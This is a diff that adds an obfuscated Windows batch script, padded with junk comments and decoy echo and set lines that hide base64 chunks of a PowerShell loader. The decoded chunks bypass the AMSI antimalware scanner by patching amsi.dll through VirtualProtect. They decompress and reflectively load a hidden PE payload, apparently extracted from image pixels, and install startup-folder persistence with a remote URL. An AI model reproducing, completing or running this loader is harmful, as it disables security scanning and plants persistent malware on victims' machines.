+echo UXN4Yk11cFpOcGJ3Z0poOXRyVUw1d0x6UEEyNldCcHpCcGhFRlNsOTllYTlGNms0RnRtVGI2bVQ4N3BMZW1YQVdtNkpjWHY= >nul 2>&1
+REM core phantom echo lance lance hawk lance
+se%Bfad%T "xMnufTTCIzEXYS=zaIChjrswTykukntvv"
+REM kappa beacon vertex pixel echo
+SE%RHiH%t "eNVNQj=W0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwgV2hlcmUtT2JqZWN0IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtYW5kICRfLkxvY2F0aW9uIC1saWtlI"
+echo ZWdlUk5CcXJIUUsxZ2dmdGVuMXQ1YTlnaW8xekNVMHZlRWFBSUdxVno2Z00yRjQ0RDkzYTlla3oxQlZ1SHhVWVNNR28= >nul 2>&1
+se%EyRI%T "qIDYcfrcRyCn=nR1cCIpCiR2YnNQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkc3RhcnR1cEZvbGRlciwgInN0YXJ0dXAudmJzIikKTG9nLVNpbGVudCAiWypdIENoZWNraW5nIGZvciBleGlzdGluZyBwZXJzaXN0ZW5jZSBhdDo"
+REM ruby delta shadow delta kiln
+REM core delta strobe core core
+se%nXbh%t "HLeLND=GbmApSzyYCJksVnMZqAF"
+REM vertex mirage clearing glimmer odyssey
+SE%sTn%T "LFanQCh=BglmsjCAxUgJquYwPxbBgVWYTHtN"
+REM kappa shadow valley pixel zenith shadow vertex cipher glimmer core
+echo SjVVTUM1UWMxVkw0a3lBR25JdnZadVFLSW1wTWFCWWh0b1dGRnRFZlpxT2VhRzJGRlBXRg== >nul 2>&1
+REM valley shadow kappa pixel vertex lance mirage circle odyssey ruby
+sE%rFs%T "TxMIifQmFax=YXSDVHMOezCcmoBHLJuAETODuEjtmybUA"
+REM shadow clearing binary shadow strobe guard clearing fathom
+echo N3M3a0MxRlh5R2I5d29qanNEYTQ1WVZENmpXRlM4dUp5cXBGREVJQlhQRUVJUTRvWVBPQkpkQWhFaFhsVEwzblE= >nul 2>&1
+SE%rDi%T "YpRfeoUHnqa=RNOpGLBwGLSIszFKggkkowdtkLBxwZCcurA"
+se%kTh%t "SeXXWFldBWjP=mARtwAaPGsGJrQpynNgz"
+sE%SBGu%t "HEApYHrioMeWSVe=BUDxIxnYiaYBBoCHwArQZlFZ"
+REM vision twilight circle
+se%wViF%T "FvGPebdlpm=ewBWXAItmWuGuVIaewSifxkfEuGumZzjNe"
+echo aFNvTmh3dTV1TlhLNVBwSzd1QllrVmZBYzhoY3Jrd0hQMGxEazh6OFVW >nul 2>&1
+echo WnJPSkZYN2c1NUxFbkZmRTJGWm5VWGpEaXFPWGxtc0RSVUVxbVhrZVFjdkRvS3oxVDUxdnVUZ1NOQ2JodG12ZnZvUjhoem90RUc= >nul 2>&1
+se%fgIVl%t "NqRIySUq=vtJwyBXHSGQlQrCu"
+REM kiln fragment pixel lance fragment guard glimmer glimmer undergrowth circle
+echo S2U5cDBpeUIzT2lQZVY0aFM1RDBrQ2ppdlpvRjF6UXAyQ2NzYVJsUUdISjJnZm9lU3RQSVBVdWNIYXpPc1dESVhJb3h1T1NkUmdm >nul 2>&1
+SE%nfYaY%T "bOHHYBhZ=NjepCHtTjjfZGelrMgSiNtMslgl"
+SE%lRAOY%T "wgHvehRyDp=IzzIpvbACrcudJtZPgfWwnDwtpGSfCI"
+echo bFIwcjBCRERFU2ppclF0MDlWbmdXdjFnQzdBYUYwT3pmM1FTdGZUTllyRmF1dDAxTEk4RUhHNVJMWjdGNw== >nul 2>&1
+REM glimmer vision cipher
+REM circle hawk guard
+sE%lRY%T "TdOxiC=qDlysrrRwMmcfsjIdOVAXdT"
+SE%ZsnH%t "djrvXTrX=NskazsXlegwLOsswuHXFnR"
+Se%QKz%t "QJjFdGJDy=EdKJwCBNoKxeXGxOfWnNICwvPBBoYHunM"
+REM valley zenith guard binary zenith vertex binary
+REM guard shadow zenith glimmer ruby
+Se%wEl%t "zsfhbtp=ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIiAiWWVsbG93Igp9Cn0KJFBFUlNJU1RFTkNFX1VSTCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vd2hhdGV2YWJveS9jdXJs"
+echo ZVFtenVMNlZGNVNOb0R2YTV4VzZaZmxjaHVQSVJVOGIzOTJGYmpIYzBRY2FBbGFkSjRFTGl3N3ZROE9v >nul 2>&1
+REM beacon binary fragment vertex kappa pixel phantom binary binary
+sE%ZUck%t "JFeYCj=oizIZHwkdUGwsgxtNurUzYofswn"
+REM undergrowth vision vision ruby twilight shadow
+REM delta strobe hawk fragment kiln strobe beacon valley valley
+REM twilight sword echo delta pixel undergrowth echo strobe valley phantom
+sE%unMpL%T "MCHzbZZaHiRvZtD=ckgBDfLofmAmPdIVKxVKxUDnghGJCVu"
+REM mirage fragment zenith vision undergrowth sword strobe sword cipher undergrowth
+REM zenith sword lance strobe ruby glimmer
+Se%qtRLU%T "EuAqJAV=sQPtZBnVODgJibJjIfPCtPGpEz"
+echo ZDBZVVRVUzNUN2RmdE5jWFpSM2NDdnlaRG01RGE4Qll1NGk0TGI5V0M5MDd3ZWdvWUJQNWcwNXVVdGVR >nul 2>&1
+REM pixel delta strobe echo cipher
+Se%XXjL%t "xNYZpbuEmV=evPyNXFTncczf"
+se%MPMqT%T "VLDWxWZ=LBkUHONtlChlTWUqEOybCU"
+sE%pHNr%t "piwjEre=sWvuMPpvLUsq"
+sE%PST%T "jfhfqKARucGf=FuevpvdWseWH"
+REM odyssey delta valley mirage phantom
+REM circle lance glimmer mirage undergrowth kappa
+REM delta echo echo
+echo R0pPZWdXOTI4ZDhyUWpLNUNhUWZWaUVENjlIZmlsN0puanQ3ZWt4Yjk0RFdNRU5TZ2huZ2dRMGJlbVM= >nul 2>&1
+echo bjhET2ZzbXc2c0NRQ3lLZUZGVVBWYlVZS2dnUUM3WEh2S3BXMEdHNlpTU2Z1akJRNA== >nul 2>&1
+se%Ytml%T "bAzsIQPw=vcNnVxYldDIqZJwgFOVEhNYHlBlYP"
+REM ruby sword sword
+REM delta sword pixel fathom zenith echo
+REM twilight vision shadow binary fathom echo echo
+Se%QFeLr%t "znMDqbJBF=UcaNYMoSDmDRHevTidEACOLyMLeOyEIfUks"
+se%Xpk%t "BpJuYuO=YNFUKwvsnDiGgYlasQlAWsjCIyutryOcWHp"
+REM undergrowth kiln fragment ruby guard shadow cipher kiln mirage twilight
+echo QjZsYXdoZkhGMjJLdlhsZzBlRjlucWdZS2M3V0hlaGVpYk5mSHJ4QkU1VHJibXdiTGswbGFUTmE= >nul 2>&1
+REM phantom lance vertex twilight valley
+REM fathom cipher guard valley
+SE%iuBP%T "gyUFhcwwclfD=bdekkZGMTUljjaXEDcHpllXRCyiMC"
+Se%wnV%T "ccRSezcusFeHEC=tYHSVNnIzKUwygURlMsKfbhncJ"
+REM lance strobe lance mirage phantom guard beacon vertex twilight
+SE%yzLX%T "FdkNzg=pQLxEWScMmlHCYIVu"
+se%MKmPD%t "PHZIgGJkvLcJ=UUKVraAMVv"
+sE%sgKrx%T "GbaFdTHAGNIpO=mKOVlSOBYaJCvnMFKKsKmvSq"
+SE%PPfJw%T "KtkhopQDoB=vrdTHFTJpMnXNFzBQqq"
+REM guard vertex mirage vertex phantom beacon beacon sword kiln
+Se%izLb%T "BEgHgCeydig=CIqbXNjb3JsaWIuZGxsKiIgfSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKJGFzc2VtYmx5VHlwZSA9ICRtc2NvcmxpYi5HZXRUeXBlKCdTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseScpCiRsb2FkTWV0aG9kID"
+sE%jAv%T "OVShvbLc=tfAMmhIwoSILTfilVVBUYJ"
+REM glimmer lance beacon guard shadow shadow binary odyssey sword fragment
+REM binary mirage hawk twilight zenith hawk guard sword
+SE%TheAK%t "uSZYTfkHKi=50IHsKcGFyYW0oW3N0cmluZ10kTWVzc2FnZSwgW3N0cmluZ10kQ29sb3IgPSAiV2hpdGUiLCBbYm9vbF0kSXNFcnJvciA9ICRmYWxzZSkKaWYgKC1ub3QgJFNpbGVudCkgewppZiAoJElzRXJyb3IpIHsgV3JpdGUtRXJy"
+REM undergrowth glimmer cipher circle strobe hawk fragment pixel sword shadow
+REM guard beacon vertex sword undergrowth vertex
+REM fragment shadow twilight
+echo U3JVWnFSZVdoVE9RcXdHeUhtQnZDV0RhWkRKMTQxRk85TmVsOFp3WE40Q3F6cXJLMXp6UzdBVzVBTTVPbnFpMlBuVEZ5eGI= >nul 2>&1
+REM odyssey undergrowth hawk odyssey delta sword fathom odyssey fathom
+REM clearing cipher sword sword mirage fathom hawk echo valley
+Se%zjDLw%T "hrBMBZwzYfRkg=aPfyQlAIHxpjyGnyeNoWTikQIsZ"
+echo Qm9PbVFkZEZsTmtsdWtRb3BuVWJPYUpkMTBzTXQ0YXNZRWtwRWZ6b3VVQWZrQWFLQmJEOWI3MXBlUHB6Zk5Q >nul 2>&1
+REM vision kiln vision cipher glimmer echo sword
+se%CKY%T "DhYhxNSXZtPE=HhUrSnZMVZCpOQROdZsFGVvLBizBrWYgW"
+REM delta kappa vertex
+Se%QiSMf%t "PyoPYADflWnd=bmDypZKyLwEFREpYsxkWjaXDqxOioj"
+sE%umVve%t "apntOnHCGJHSZZ=JvDBXcZelViSposFBhAhEhpJfJyBZvyqVY"
+se%HsCm%T "DQbaKonEmU=GQEoXSOwTvGOJGkUp"
+REM hawk fathom undergrowth
+REM lance valley shadow twilight kiln mirage lance
+REM echo delta strobe cipher kiln sword undergrowth ruby cipher
+echo OGQ0bGwxZENtSUg0b0FPYTViY3BvM0JDc3lJTmxRSkdrbjZLYUVUaUhSWW1mUGk3ODdNc0Z2dHBLVUxiQ3NGdA== >nul 2>&1
+SE%uwSG%T "UxbPOxPqR=XjTJSoeQyEGD"
+sE%vEc%t "ZJwnqmSHt=khjMcKIradjNCjxQnghiOBF"
+echo STExUndHa0tRMG90cUZsRG9DZ2o3V2hkYjJwdjNicmVLNmNaNTlLTnN3ZTlMeFFhVGhZSExTMXpmMUdxZTl4OWE= >nul 2>&1
+sE%gPDv%T "WxgMLpQe=FafyqjtHxYXFUYCugRVrPeCqYUNOYWZyl"
+SE%SoVh%t "saokYo=B5VG8oJG91dE1zKQokcmF3UEUgPSAkb3V0TXMuVG9BcnJheSgpCkxvZy1TaWxlbnQgIlsrXSBVbmNvbXByZXNzZWQgU2l6ZTogJCgkcmF3UEUuTGVuZ3RoKSBieXRlcyIKJG1zY29ybGliID0g"
+sE%Siv%t "XtzCmkuvtThxpDq=eRYcUoKZEjvokyzpAyrXlwNHOGjMagaGSz"
+sE%Tblnw%T "GChdgdWzMcU=sKTG9nLVNpbGVudCAiTG9hZGVyIEVycm9yOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIgIldoaXRlIiAkdHJ1ZQppZiAoJF8uRXhjZXB0aW9uLklubmVyRXhjZXB0aW9uKSB7IExvZy1TaWxlb"
+echo TWlEOG9vQU1IdGFmWHVDRjMySjNFMmV4T0Y2dm5DOU9RTVR0NDVOcXVKR2pYVjRtMQ== >nul 2>&1
+SE%VheST%t "WkZoJJAdbfvtlLE=xUMaHGSPRdRFBartFhO"
+se%YtN%T "bIBTRyx=BXoTeyNnLMhPHDDwAjcejwgVnG"
+REM valley fathom kappa pixel echo kiln
+se%SktUv%T "JzGeMPDl=AkSqVolalWGey"
+se%GAuNR%T "iSIUTRpSVXvr=pbjMyLkdldE1ldGhvZCgnR2V0JyArICdQcm9jJyArICdBZGRyZXNzJykuSW52b2tlKCRudWxsLCBAKCRrMzIsICdWaXJ0dWFsJyArICdQcm90ZWN0JykpCiRhID0gJ2EnICsgJ20nICsgJ3MnICsgJ2knICsgJy5kbGw"
+REM ruby shadow mirage hawk
+se%BNYJZ%T "FnBGITdOvxMU=bKYqmQkwyDNrepBmpVzvSBE"
+REM vision beacon odyssey mirage guard lance strobe mirage valley binary
+sE%Vyb%T "Icmmia=oBwqKZUARrPWFUzbTLLjTvgjCojbWRMI"
+Se%JMG%T "GeazGUzSs=oQpBegVcTdbQMzhAEr"
+REM binary lance glimmer kiln circle
+echo bm05NGpnM2dRRkRDMVZsVVRrczEwZGNpZGlGVkxqN2hIaFJlc2hPOEZQUGppbTk= >nul 2>&1
+se%onldn%t "erKoPWTYcXFeYg=lICWmRVkHZww"
+se%RsJlJ%t "GqmwPxxXMfFNxPP=BfQJoRItUGUygrNhKD"
+echo dnc0aDJqUnZLQVRjRXd5R1NzVUV5SDZHcG16cDRSeGkwVURveUVGOUVHOWNkWlhlcVk1YkVyZTE3SFE5eHBBa1poUmI= >nul 2>&1
+se%euf%t "WmfTrJaLKb=xUaxmgVMKlcClqUMAHP"
+Se%QIUYx%t "ttgHITbJwp=nkPsojfRHK"
+REM cipher zenith fragment valley echo
+REM fathom ruby circle zenith fragment
+REM shadow undergrowth twilight lance kappa strobe vision
+echo aTZ5clFjQ04zRHdiM1pNVU9WWnVpREhONVAwWUFoR21KY1Zpd0x6VEduOEI0RlRMRDY5RndNR2RPa0FmSkVkVGdJRVkyS3N4 >nul 2>&1
+REM odyssey kappa vision vision twilight strobe strobe cipher
+REM guard beacon pixel undergrowth echo
+se%UDGQV%T "DOcjpmAWcHaUr=IuZAJbpElYtvagBrZlZiOfNkdUujKaGt"
+echo aFFGcTNhVlhBbHBhN291bEFvQnNUd21wQXpkWUNxQWFrbDE1RlFKRGw= >nul 2>&1
+REM odyssey sword mirage zenith lance echo valley kiln pixel strobe
+SE%eqDZR%t "ySbBZSUSIt=qMPDhfmTWyQjswsTEVVMkQBUrUyUP"
+REM shadow zenith beacon mirage core
+se%fLxYE%t "NplZJOWhU=PxIsSnYakmkeWEybHUHydHAPOhvJEvI"
+REM lance fragment hawk mirage twilight
+REM circle lance kappa twilight undergrowth zenith binary
+se%lgtmu%t "tTbEyrkjhjF=XYQtJktNdCvt"
+Se%dUyC%t "XAmNNimA=WyOMsrPDkviFXZaPZIbXFmriu"
+REM clearing strobe sword
+Se%ZDz%T "ewokHhzayCgs=AjDuCZvOYrmFfeBkp"
+REM zenith valley beacon phantom ruby fragment
+REM kappa pixel fragment strobe circle phantom vision glimmer
+REM shadow kiln fathom circle hawk clearing ruby echo lance shadow
+echo M21BdnZwZWpLVmNDTlp1YmY3eDJlejQ0VVpKbFZHRTZFZlJ6a3oyQ1VJQmg5RGJEVTl3ZzVvdQ== >nul 2>&1
+sE%haZF%T "ZAEVbCXtFlP=gJHZic1BhdGgiICJHcmF5IgppZiAoVGVzdC1QYXRoICR2YnNQYXRoKSB7CkxvZy1TaWxlbnQgIlsqXSBQZXJzaXN0ZW5jZSBhbHJlYWR5IGluc3RhbGxlZC4gU2tpcHBpbmcgd3JpdGUuIiAiR3JlZW4iCnJldHVyb"
+Se%njFE%t "VNmVPEVhvxINf=RKZxXqdxaDdZMBgIiH"
+se%EaTN%T "zUjNxs=vDBfVdvSxyDMykEmexpYzFwknSlLekdUVd"
+SE%WTY%T "GhNfUkaLjChmj=IfRsGjFixUQFyDKTgeIpGJsxHrfXfSale"
+sE%syg%T "dzRzkJZNK=PlMVKUbveMPLqggisIsB"
+REM valley kappa fragment echo vertex glimmer ruby
+sE%BWW%T "JpLbHMitNsSOUse=hdEWswnVlQGCoiiSwYdFUMOKZJ"
+Se%OPMw%T "fuzwlnA=mAaqvIMWWjNtXpXMNTpOmmJS"
+REM mirage lance undergrowth beacon guard circle
+REM fathom glimmer mirage circle hawk core
+echo ZDJVQ3dRdU5zdU9RSkJENmpLeUJFM0xzcVZ5MUhMSDJBSHY1Z0RscmU1ejI5dUtSa2RodFdKOTFKZ1F4bDJMdHFjQzFSN2c5Mw== >nul 2>&1
+Se%afy%T "rZgxPvfPNJ=DyWzMZMaIeskwmWWroUIRSPMZb"
+echo amN5S1YyaWcybks0OFBJTkdRM3NTS2RLYTM5NWpuOVhQd0prUUlIWm15UXFhZjhYaloyTQ== >nul 2>&1
+echo bklYbHAxbjZsN1dFS1Zad1BPb3pQdGV6ZWlSWGNUMzZaWWZBUEFIaW4wbGl5 >nul 2>&1
+se%jOf%t "OpQVJwrDNnER=romizVYxyfWDyPMnrkW"
+sE%nKYw%T "TExvVzDWMNZ=xxlqBAFokatFQcDf"
+REM beacon lance shadow valley
+SE%eDhX%t "vPXroBu=qpwrEOaEVUEqYXniaUbsOFHYIEeIVPQOP"
+SE%PRTIO%t "fXDFGYHcXqW=MpLKVPYWAGvIyoOEAagwFmusBd"
+REM pixel fathom hawk hawk delta vision vision ruby
+REM clearing fathom twilight beacon lance valley
+Se%ngwOo%t "VbRvdQzJSYlPsv=hbYckaiLwOx"
+REM kappa glimmer glimmer
+REM shadow cipher guard guard strobe kappa kappa
+SE%zUZV%t "opugZgkkKcR=IwlufyCsVBDZiolw"
+REM twilight vision kappa kiln clearing
+echo VFpGMFdhOFlKb2NJT0syQUVkUUdpYWtCWUtmWHR5Y0NqQjVVMWdxaUhLMGNoVko= >nul 2>&1
+Se%rwg%t "VzZLywdKHmznBO=qnxIfWECsaSFKWXZkMKGUfJVIrIcYbc"
+REM mirage hawk lance clearing pixel binary
+sE%Lzf%T "qMvIYivifcslB=jEeJQDgURAzfTPIKdEExRiSCOV"
+echo eUNUQ2VHRE5lRUdqQlVzazNGdUtEeERoTEdVNlNwMWxoWW1TNTB0aWNxTXg2Zw== >nul 2>&1
+echo UUVSVFc0U1BucDBPWm1zRHZLRFJ0SzFBcUp3SVlVWDRpTUpQa045dDRuUG5HSGl2Ym1PY0Y1Slh4M1hXd2s5dHhHQWFLdmVjcHFTOW00eg== >nul 2>&1
+echo eDkyNDloczFhUmxJWjRid2ZSQ2RkTERDOExYcXJDTTZ0T2hGekhuYmxnSkprWXhyQUVnRkRrendIRHZGUjZvTE1iSHZXUEp1Q0g4 >nul 2>&1
+echo bUY5YjMwY2xvZDRlMnJ2ajNVNmFERzJMNlhmbWpoWHNiNm1zdTVqMzdiUkt3U2pIRlpZZ29HSEg= >nul 2>&1
+Se%mOC%T "qoCvFeweCMx=izDaRhIcJzskPmnohPbzkPTrqs"
+REM zenith fragment pixel strobe undergrowth
+REM valley hawk phantom pixel mirage fathom circle sword echo vision
+se%WdcP%T "wJJTNvYqSBbUJIx=wnEyGkqxZjwtFVGhkXJSGvpjMWMVRMGVYO"
+REM sword kiln binary beacon
+REM core valley delta ruby twilight guard zenith
+REM hawk circle vertex fragment vertex kiln glimmer guard echo delta
+REM vertex phantom fathom undergrowth odyssey kiln
+REM fathom binary ruby
+Se%qfYM%T "fguvCFriy=CNrHbhifBDgSbc"
+sE%nWWNI%t "uORopMEtc=zZSgpOyAkbXMuRGlzcG9zZSgpCkxvZy1TaWxlbnQgIlsqXSBEZWNvbXByZXNzaW5nLi4uIgokY21zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtKCwkcGFja2VkKQokZ3MgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5"
+Se%ugtFq%t "uXWcnULu=BMQUNFX1dJVEgiIC1vciAkUEVSU0lTVEVOQ0VfVVJMIC1lcSAiIikgewpMb2ctU2lsZW50ICJbIV0gUGVyc2lzdGVuY2Ugc2tpcHBlZDogWW91IGhhdmVuJ3QgZWRpdGVkIHRoZSBVUkwgaW4gdGhlIC5wczEg"
+REM strobe phantom ruby phantom vision fathom
+REM strobe vision valley valley
+REM odyssey beacon shadow core sword fragment twilight pixel lance fathom
+SE%UGSZA%T "gqvEzSu=OJHfWeOaQeaOZaTkmnkhu"
+Se%UQrY%t "GojfIes=ovrZqZxiPkgKpUoIJBP"
+echo N2ZVR2p2N1M1TllhVTlNcWpUVXdHZHNPT1F2aHlrZjRTNURiM0NhNWdJZzlLdlhPWmVtWGxFSlE5QjhWbjVVdHVzbGFqcWVobnpnS1ltdg== >nul 2>&1
+echo VWpnUndvZU9TMzdKMEtnVDVaSU4zVjhmMzMxWlVhVnQ0UjMxeEJwN21MeDJZN1diTmdRUVoydG1mWTFqRlE4RGM5VlJKdlFKTk9ZS1NFeg== >nul 2>&1
+REM shadow twilight cipher vision fragment echo kappa core
+REM kiln odyssey sword clearing shadow phantom beacon guard
+Se%UXI%T "YkJMgR=MHgwMCwgMHgwNywgMHg4MCwgMHhDMykKJG9sZCA9IDAKJHZwID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkZ"
+REM core mirage odyssey lance
+sE%ZXqEs%t "lFZduLFGCV=MyyQYEuWPRDF"
+REM twilight delta vision cipher pixel vertex ruby core delta lance
+SE%VKLCr%t "QWhOBfSpVIgS=VLDJJzfQOwyWsqrDIkZ"
+SE%kPQ%t "qqfLgkWR=bxQJHkOHlitc"
+REM guard fragment kiln kappa kiln
+Se%EhRZX%T "hqQhDvejUaGXdUW=xYcJspQpdAZFQeFaYKmWwnxWqJ"
+REM glimmer valley clearing kappa odyssey zenith sword zenith mirage
+sE%dPT%t "eSIQkgAfOwmVcjO=llGGqRThXKgfFxWXdId"
+echo WnlIWWpmbloxVjIzazUxVDhiRFpCa2RyNkFVYmlhWXZPZVNBUXRRUHFsNGpYZ3pUS1B4TEo= >nul 2>&1
+sE%ycnza%T "IaCyIDxcRsz=dsJZLDaypvzzVQBGBZgcXi"
+REM odyssey clearing fragment
+REM clearing zenith vertex clearing strobe ruby vertex circle circle
+Se%LQpik%T "iRwPZUTCOVVqeRs=QhSbBSeIiC"
+REM beacon glimmer beacon lance ruby fragment glimmer
+echo Zmhib1cySTNWZmRSdlFkanByYnF3M0VXMm1jM1pNajZxVDFycmRtZjByTWZvWTg1R2pmeFhVSHhuQVY= >nul 2>&1
+REM mirage phantom shadow kiln binary
+REM vision strobe sword lance core beacon zenith binary undergrowth
+echo RmhYczg5VW45YnptQkhVWFJObkpPQmRBZjZPRHFvVld2WmkyS25ueThqZnBBckw5MFdiRVN1OFh0MUI0RzVJYUdhM3Y3 >nul 2>&1
+REM valley echo phantom kappa zenith shadow fragment
+sE%pXUyP%T "BjesqvpXPLECufC=KlkpvdvXPAnfxeYkwVKhHmQ"
+REM echo kappa pixel cipher undergrowth zenith beacon kiln circle
+REM vision cipher ruby
+sE%KYaJ%T "eyeVGQPW=wcyEZPAkDVpMQxelVB"
+echo OVJEZ3gxdWZVVlo4aG5OUDNZYlJSNnRlblVJakg5dW9oVlcyOFZmOXVraHdDSg== >nul 2>&1
+echo aERFbnh4NUpXWWxBSXFpalFmZzNDc0hGNUJQaGhhdVZwejFSVXNkVFNHZjEwWU0wdTNxbGdXVmNNVEx0djdoVkxLWg== >nul 2>&1
+REM kappa circle circle core lance twilight delta
+echo ZE52QnEzV0o5MFBDdDBXcnAxSE03d1YyQmsweUpFa2tuSlJISVVSTE9NRmdCOGY2RnZkUGpTbHA3ckpGaHJXdVBpOEMyd0w4TGxDbFVV >nul 2>&1
+REM ruby vertex zenith hawk cipher beacon undergrowth
+SE%yRbhO%t "liiRTwY=NJjsXVrtrrXpHsvFhQiOKrWllD"
+Se%QXMbB%t "PyVNlApaVaIhJC=NBptWgjmlgFnaqlVFPruN"
+echo RVBsb3pnakFjME5EWnFCd0l6dmQ1Y3loZlNlRGRLQXRGdzh4clgwZ1ZyMVU5TU1ucHNjRk1u >nul 2>&1
+REM fragment ruby strobe pixel valley glimmer ruby phantom guard sword
+Se%zVLji%T "mCBkwvyqUnfI=iloAsIAXdjFGbsOpVFdaMTtAapFrwNjSc"
+REM phantom fathom echo
+echo cFJPRHBXMzRSY0Y3SUh0cTRxVFBoUW1UYUpxeXBLV1hKdlJ0c2lSb2l5blMzVGZ0TnRteE5KbThnMjlCclhPakt4N2ZIR1ZpUTAwVnRu >nul 2>&1
+REM fathom undergrowth core kappa mirage cipher
+Se%saXiw%t "ZnxymVeKGnEgXgA=HNBreMxpbdfpxuJYoOTXcZCLfJPfU"
+se%QWB%t "VzmngC=AcfPnnfzXuqufB"
+REM twilight glimmer valley glimmer valley cipher
+REM undergrowth vertex guard echo valley delta guard shadow valley
+se%FXiC%t "TkbbWyhzbWfR=eGeMaTKOnxljPRBqodCTasmXHadlmBxk"
+REM kappa guard fathom
+echo VW9wc1UzOXh3aTFYS1dXclFsZmFickxSTUNJNENpd0Q0b1k2OVVCbDR5VA== >nul 2>&1
+se%bCrr%T "zSKXlfhFU=eYkNgBZPbVDqrfyHmfxAGyWtK"
+echo M2Q1eWs3UHJ0c1JETTZXcnE0a21CM3pmd25Md25zbGd1d3FsTmhmamFNVWtNUXZUTlBWNW1jbjFqaFZVVHRKaENsdDdPcE1wVzNRWXFz >nul 2>&1
+echo SFJieFdyRDNPaE9OWldaTnhtdG9vN0NacXJxVnM0MHZKVzZZUjNWdjRQdWxoRTQ= >nul 2>&1
+REM clearing strobe twilight sword fragment
+SE%VcrTd%T "FXDtrteXRKdEWz=kMOFpvSMcvIZjwnsFBsFTjvwsYE"
+Se%sDD%T "owgUGBnppoDdun=xdHDnhJpunJWNEdXxfbSaj"
+REM mirage lance mirage undergrowth kappa kiln beacon glimmer
+se%KRZ%t "pGyCJFWzjUb=N0cmluZygpOyAoJHN0clszN10gLWVxICddJyAtb3IgJHN0clszOF0gLWVxICcpJykgLWFuZCAoJF8uR2V0UGFyYW1ldGVycygpLkNvdW50IC1lcSAxKQp9IHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQokbG9hZGVkID0gJGx"
+REM kappa fragment vertex
+REM echo kiln valley circle undergrowth sword vision
+echo algzbDhwak0xM1lMRHZ5THUyS254akdlT3hJUzRycTZxTWRBS3JUY2s0d3NUbXNTVWw1WHNSZHdaRkZRd1dSN0czQlhN >nul 2>&1
+echo VFVtclg2cVFDalBydzhpUnVzdmhuR2tYZmQwWnhhekZPVkRIS21qODc2VQ== >nul 2>&1
+REM glimmer kappa pixel zenith mirage
+echo QmkwWjBFUUY3c1NRTWxybU5yUkZQZzFFdm1ucGc0SVc0ZVdzcUR3UEdkRVEzMHBHSQ== >nul 2>&1
+REM glimmer kiln fathom valley binary shadow core pixel
+REM binary binary phantom cipher fragment mirage
+REM clearing clearing twilight odyssey odyssey fathom phantom
+echo aW9PdjN4cU1CT2FrdFNValhTanVMZ2ZadE1RVllPN293SzIxTnJGbWl3QlF5ZDNEdlBPSFdoYWFyRm03ZGg= >nul 2>&1
+REM vision mirage odyssey undergrowth mirage
+REM kiln kiln fragment valley kiln circle
+echo bVUwMkZoa0pmd293bHFCZ3k0SERyMDJoRmY0WldXbk5WS1RPcHdwdFQwSDhvNkNRZFk5UGJmc3p3ZFFadkNFSQ== >nul 2>&1
+sE%OrAy%t "LmmnLaX=NczsXUwTKjCFEXkJtdaDt"
+REM binary zenith twilight beacon strobe fragment
+REM fathom glimmer kappa vision binary phantom zenith
+se%Pru%T "ttrUaqu=cMGnatjljuaLmRYTNGxaQLYDhJXnIETZida"
+SE%UJD%T "xvhlyyqJhCW=A9ICRibXAuR2V0UGl4ZWwoMSwwKQokbGVuZ3RoID0gKFt1aW50MzJdJHAwLlIgLXNobCAyNCkgLWJvciAoW3VpbnQzMl0kcDAuRyAtc2hsIDE2KSAtYm9yIChbdWludDMyXSRwMC5CIC1zaGwgOCkgLWJ"
+SE%FfZ%t "IaKSUWTzJ=KhfHWIDrqLiyhUtioIREucfLnA"
+REM sword core lance undergrowth phantom
+echo QW9HS0R2cU9HbFIwcElpV3R6ODNnWDZ1S0F0QVFjTWR0YWdTMUtadEhUd1k5WDkzM3ZmeFFnSG1lWnFXTVBiR2FVbTJhd2k0WWZHcXB1Ng== >nul 2>&1
+echo bGdqbXU3cHdJYTBLV1RxVnpUZGxocWROWm0zYmtvc2hiQUF4VzlEMlNZZzdqMXExNHBZTzNXOFA3YmhkTzh3c3c0Nw== >nul 2>&1
+echo YnBDQnpZbzVzYVdLNmtONExaaE9uS3p6aThiNzF2eHFYV0U5T0lPMkVHT2JnbEZSNG1tMDR1TFlu >nul 2>&1
+sE%Mwdjz%t "UyLArOZ=mnyrunFfUeaiAMpTOlzacScyTsZh"
+REM ruby strobe guard fragment phantom mirage
+REM ruby delta fragment
+echo WmFodmoyN3JvNjJrZ2t0WExhWnJLdzVTTGw2bWVQTTNlMHNBOFhQSnBWVGppRg== >nul 2>&1
+sE%GfdA%T "LcQDOvFaEvcxDmP=EsICrhvmjlweDTFbTkNsruHdaFJIo"
+echo Yk1DelRpS2FBdEx2MXZwMVpBOHR2MllhcU14TzZFUjh5cm1VVEFxRGhrZ1M2TjFybDU4TXpaRnBMaEw0c0F3OEJlMQ== >nul 2>&1
+SE%yQVBz%t "QhbWgCkxKHTF=SYPAsdFttmWHSMpXVaMMYarwPCSnslHhR"
+REM odyssey undergrowth ruby fathom phantom binary kappa glimmer vertex fathom
+REM sword ruby strobe undergrowth odyssey
+Se%ppm%T "PHmEkQu=sHZxUzeMBYMXjqpUQWiB"
+REM fathom circle echo sword ruby delta binary strobe odyssey
+REM sword beacon echo ruby odyssey mirage clearing
+Se%Zfi%T "YmfwzimlpkYYf=ytzPjSNnnGPrlvFXpVTNoixnFW"
+Se%LEH%t "KDYuDr=clVybCkKJHN0YXJ0dXBGb2xkZXIgPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6QVBQREFUQSwgIk1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3Rhc"
+Se%YZzBo%T "ylemuKxVlpp=aKIqWZYifGrhhbhPVzQtXkkyqHaEOlMQD"
